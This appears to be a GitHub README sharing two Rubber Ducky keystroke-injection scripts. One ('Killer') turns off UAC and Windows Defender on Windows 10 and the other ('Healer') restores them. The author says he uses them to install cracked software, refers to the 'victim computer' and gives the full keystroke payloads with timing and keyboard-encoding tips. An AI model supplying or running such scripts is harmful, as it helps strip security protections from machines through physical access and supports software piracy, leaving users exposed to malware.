# Rubber-Ducky_Disable_W10-Defender_Technician-Edition
A quickly script for Rubber Ducky to disable w10 defender on large scale

![Alt text](https://raw.githubusercontent.com/JonnyBanana/Rubber-Ducky_Disable_W10-Defender_Technician-Edition/master/img/main_win10.png "SnapChat_Leak_2018-by-Jonny-Banana")

In my activities as a technician I have to format many computers during the month, and as many refuse to buy the license </br>
i have to use a lot of crack (although I do not recommend every time, but the money they pull at the time ...).

Since the windows 10 defenses are slightly improved compared to the previous ones (even if it is still punctured like a colander ...),</br> I had the need to write a quick rubber ducky script that would disable Windows Defender on windows 10 platforms (the more installed system in our time).

I have also added an additional script that reports UAC and windows defender to the recommended settings.
The Scripts are two: Killer and Healer, the first disables and the second of course rehabilitates everything.

<h2>Killer</h2>

As you can see in the first script I set first the initial delay to 2000 ms, but I suggest to increase up to 5000/10000 ms according to the victimized computer, the more powerful the computer is and the less it will read the DUCKY drivers when it comes attached to the victim computer for the first time.

After disabling the UAC control, note that I have used only commands that disable the various functions from interface GUAR, and without closing the final window this to allow you to see if the script worked even if you were not careful ....

Once disabled The UAC was enough to type the string "virus pro" in the windows bar, I chose "virus pro" as it can work both with my native language (virus protection) and in English (virus protection) thus making it multilingual script, also because in Italy it is so much whether these things affect 100 people ....

DELAY 2000</BR>
REM  first disable UAC</BR>
CONTROL ESCAPE</BR>
DELAY 200</BR>
STRING uac </BR>
DELAY 200</BR>
ENTER</BR>
DELAY 200</BR>
DOWNARROW</BR>
DELAY 200</BR>
DOWNARROW</BR>
DELAY 200</BR>
DOWNARROW</BR>
DELAY 200</BR>
TAB</BR>
DELAY 200</BR>
ENTER</BR>
DELAY 200</BR>
LEFT</BR>
DELAY 200</BR>
ENTER</BR>
DELAY 200</BR>
REM it's time to disable the fuckin' defender....</BR>
CONTROL ESCAPE</BR>
DELAY 200</BR>
STRING virus pro</BR>
DELAY 200</BR>
ENTER</BR>
DELAY 200</BR>
TAB</BR>
DELAY 200</BR>
TAB</BR>
DELAY 200</BR>
TAB</BR>
DELAY 200</BR>
TAB</BR>
DELAY 200</BR>
ENTER</BR>
DELAY 200</BR>
SPACE</BR>
DELAY 200</BR>
TAB</BR>
DELAY 200</BR>
SPACE</BR>
DELAY 200</BR>
TAB</BR>
DELAY 200</BR>
TAB</BR>
DELAY 200</BR>
SPACE</BR>

<h2>Healer</h2>

The second script instead rehabilitates the UAC first and then takes care of Windows Defender, in this case I chose to close the window to have no further action to do, so if the script does not work will remain locked on a random window ...

DELAY 2000</BR>
REM first enable the fuckin' defender....</BR>
CONTROL ESCAPE</BR>
DELAY 200</BR>
STRING virus pro</BR>
DELAY 200</BR>
ENTER</BR>
DELAY 200</BR>
TAB</BR>
DELAY 200</BR>
TAB</BR>
DELAY 200</BR>
TAB</BR>
DELAY 200</BR>
ENTER</BR>
DELAY 200</BR>
SPACE</BR>
DELAY 200</BR>
TAB</BR>
DELAY 200</BR>
TAB</BR>
DELAY 200</BR>
SPACE</BR>
DELAY 200</BR>
TAB</BR>
DELAY 200</BR>
TAB</BR>
DELAY 200</BR>
TAB</BR>
DELAY 200</BR>
SPACE</BR>
DELAY 200</BR>
REM alt f4 close the window</BR>
ALT F4</BR>
REM it's time to enable UAC</BR>
CONTROL ESCAPE</BR>
DELAY 200</BR>
STRING uac </BR>
DELAY 200</BR>
ENTER</BR>
DELAY 200</BR>
TAB</BR>
DELAY 200</BR>
UPARROW</BR>
DELAY 200</BR>
UPARROW</BR>
DELAY 200</BR>
TAB</BR>
DELAY 200</BR>
ENTER</BR>


<h3>Tested Builds</h3>

1803 (latest oct. 2018)


<h3>Conclusions...</h3>

This fast script can be very useful in cases like the one explained above.</BR>
The script is not particularly short, this because I did not feel the need, and it is not even hidden, but as I said also this was done on purpose, so as to allow you to see the screen and understand so if the script worked, as it is not a script dedicated to attacks but serves a specific purpose.

The two inject.bin files were created specifically for Italian keyboards, if you have other keyboards you can copy the script and use the ducktoolkit https://ducktoolkit.com/encoder/ to create a binary file for your keyboard.
